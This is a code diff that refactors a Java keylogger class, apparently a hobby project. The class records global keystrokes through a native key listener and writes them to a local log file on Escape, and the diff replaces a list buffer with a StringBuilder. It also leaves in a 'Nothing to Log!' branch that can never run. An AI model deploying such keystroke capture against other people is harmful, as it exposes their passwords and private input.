@@ -12,11 +12,9 @@ public class KeyLogger implements NativeKeyListener{
 
 	private String fileName = "/Users/Summit/Desktop/log.txt";
 
-	private ArrayList<String> data;
 	private StringBuilder sb;
 	
 	public KeyLogger(){
-		data = new ArrayList<String>();
 		sb = new StringBuilder();
 	}
 	
@@ -31,17 +29,14 @@ public class KeyLogger implements NativeKeyListener{
 			logFile.setWritable(true);
 
 			out = new BufferedWriter(new FileWriter(logFile));
-			if(data.size() > 0) {
-				for(String line : data){
-					out.write(line);
-					//out.newLine();
-				}
-				if(data.size() == 0) {
+			
+			if(sb.length() > 0){
+				out.write(sb.toString());
+				if(sb.length() == 0) {
 					out.write("Nothing to Log!");
 				}
 				System.out.println("LogFile Written Successfully!");
 			}
-
 		}catch(IOException e){
 			e.printStackTrace();
 		}finally{
@@ -59,7 +54,6 @@ public class KeyLogger implements NativeKeyListener{
 		System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
 
 		if (e.getKeyCode() == NativeKeyEvent.VK_ESCAPE) {
-			data.add(sb.toString());
 			createLog();
 			System.exit(0);
 		}
